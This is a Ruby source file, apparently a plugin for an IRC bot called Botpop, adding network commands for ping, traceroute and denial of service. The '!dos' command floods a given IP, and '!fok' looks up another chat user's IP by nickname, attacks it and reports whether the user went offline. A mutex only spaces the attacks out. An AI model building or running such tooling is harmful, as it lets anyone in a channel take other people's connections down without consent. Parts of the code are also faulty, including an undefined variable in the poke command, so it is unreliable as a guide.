#encoding: utf-8

module BotpopPlugins
  module Network

    MATCH = lambda do |parent, plugin|
      parent.on :message, "!ping" do |m| plugin.exec_ping m end
      parent.on :message, /!ping #{Botpop::TARGET}\Z/ do |m| plugin.exec_ping_target m end
      parent.on :message, /!httping #{Botpop::TARGET}\Z/ do |m| plugin.exec_ping_http m end
      parent.on :message, /!dos #{Botpop::TARGET}\Z/ do |m| plugin.exec_dos m end
      parent.on :message, /!fok #{Botpop::TARGET}\Z/ do |m| plugin.exec_fok m end
      parent.on :message, /!trace #{Botpop::TARGET}\Z/ do |m| plugin.exec_trace m end
      parent.on :message, /!poke #{Botpop::TARGET}\Z/ do |m| plugin.exec_poke m end
    end

    HELP = ["!ping", "!ping [ip]", "!httping [ip]",
           "!dos [ip]", "!fok [nick]", "!trace [ip]", "!poke [nick]"]
    CONFIG = Botpop::CONFIG['network'] || raise(MissingConfigurationZone, 'network')
    ENABLED = CONFIG['enable'].nil? ? true : CONFIG['enable']

    # @param what [Net::Ping::External]
    # @param what [Net::Ping::HTTP]
    def self.ping_with m, what
      ip = BotpopBuiltins.get_ip m
      p = what.new ip
      str = p.ping(ip) ? "#{(p.duration*100.0).round 2}ms (#{p.host})" : 'failed'
      m.reply "#{ip} > #{what.to_s.split(':').last} ping > #{str}"
    end

    def self.exec_ping m
      m.reply "#{m.user} > pong"
    end

    def self.exec_ping_target m
      ping_with m, Net::Ping::External
    end

    def self.exec_ping_http m
      ping_with m, Net::Ping::HTTP
    end

    def self.exec_poke m
      nick = BotpopBuiltins.get_ip_from_nick(m)[:nick]
      ip = BotpopBuiltins.get_ip_from_nick(m)[:ip]
      return m.reply "User '#{nick}' doesn't exists" if ip.nil?
      # Display
      response = BotpopBuiltins.ping(ip) ? "#{(p.duration*100.0).round 2}ms (#{p.host})" : "failed"
      m.reply "#{nick} > poke > #{response}"
    end

    DOS_DURATION = CONFIG['dos_duration'] || '2s'
    DOS_WAIT_DURATION_STRING = CONFIG['dos_wait'] || '5s'
    DOS_WAIT_DURATION = DOS_WAIT_DURATION_STRING.match(/\d+ms\Z/) ?
                          (DOS_WAIT_DURATION_STRING.to_f / 100.0) :
                          (DOS_WAIT_DURATION_STRING.to_f)

    def self.dos_check_ip(m, ip)
      return true if BotpopBuiltins.ping(ip)
      m.reply "Cannot reach the host '#{ip}'"
      return false
    end

    def self.dos_replier m, ip, s
      if s.nil?
        m.reply "The dos has failed"
      elsif BotpopBuiltins.ping(ip)
        m.reply "Sorry, the target is still up !"
      else
        m.reply "Target down ! --- #{s}"
      end
    end

    # This function avoid overusage of the resources by using mutex locking.
    # It execute the lamdba function passed as 2sd parameter if resources are ok
    # At the end of the attack, it wait few seconds (configuration) before
    # releasing the resources and permit a new attack.
    #
    # @arg lambda [Lambda] lambda with one argument (m). It wil be executed
    def self.dos_execution(m, lambda)
      @dos ||= Mutex.new
      if @dos.try_lock
        lambda.call(m)
        sleep DOS_WAIT_DURATION
        @dos.unlock
      else
        m.reply "Wait for the end of the last dos"
      end
    end

    def self.dos_ip(ip)
      return BotpopBuiltins.dos(ip, DOS_DURATION).split("\n")[3].to_s rescue nil
    end

    def self.exec_dos m
      dos_execution m, lambda {|m|
        ip = BotpopBuiltins.get_ip m
        return if not dos_check_ip(m, ip)
        m.reply "Begin attack against #{ip}"
        s = dos_ip(ip)
        dos_replier m, ip, s
      }
    end

    def self.exec_fok m
      dos_execution m, lambda {|m|
        nick = BotpopBuiltins.get_ip_from_nick(m)[:nick]
        ip = BotpopBuiltins.get_ip_from_nick(m)[:ip]
        return m.reply "User '#{nick}' doesn't exists" if ip.nil?
        return m.reply "Cannot reach the host '#{ip}'" if not BotpopBuiltins.ping(ip)
        s = dos_ip(ip)
        r = BotpopBuiltins.ping(ip) ? "failed :(" : "down !!!"
        m.reply "#{nick} : #{r} #{s}"
      }
    end

    # Trace is complexe. 3 functions used exec_trace_display_lines, exec_trace_with_time, exec_trace
    TRACE_DURATION_INIT_STRING_DEFAULT = "0.3s"
    TRACE_DURATION_INIT_STRING = CONFIG['trace_duration_init'] || TRACE_DURATION_INIT_STRING_DEFAULT
    TRACE_DURATION_INCR_STRING_DEFAULT = "0.1s"
    TRACE_DURATION_INCR_STRING = CONFIG['trace_duration_incr'] || TRACE_DURATION_INCR_STRING_DEFAULT
    # Conversion of the string to value in ms
    def self.config_string_to_time(value)
      value.match(/\d+ms\Z/) ? value.to_f / 100.0 : value.to_f
    end
    TRACE_DURATION_INIT = config_string_to_time TRACE_DURATION_INIT_STRING
    TRACE_DURATION_INCR = config_string_to_time TRACE_DURATION_INCR_STRING

    def self.trace_display_lines m, lines
      lines.select!{|e| not e.include? "no reply" and e =~ /\A \d+: .+/}
      duration = TRACE_DURATION_INIT
      lines.each do |l|
        m.reply l
        sleep duration
        duration += TRACE_DURATION_INCR
      end
      m.reply 'finished'
    end

    def self.trace_with_time ip
      t1 = Time.now
      s = BotpopBuiltins.trace ip
      t2 = Time.now
      return [s, t1, t2]
    end

    # see {trace_execution}. Seem system without sleep
    #
    # @arg lambda [Lambda] lambda with one argument (m). It wil be executed
    def self.trace_execution(m, lambda)
      @trace ||= Mutex.new
      if @trace.try_lock
        lambda.call(m) rescue nil
        @trace.unlock
      else
        m.reply "A trace is still running"
      end
    end

    def self.exec_trace m
      trace_execution m, lambda {|m|
        ip = BotpopBuiltins.get_ip m
        m.reply "It can take time"
        begin
          # Calculations
          s, t1, t2 = trace_with_time ip
          m.reply "Trace executed in #{(t2 - t1).round(3)} seconds"
        rescue => e
          m.reply "Sorry, but the last author of this plugin is so stupid his mother is a tomato"
        end
        # Display
        trace_display_lines m, s
      }
    end

  end
end
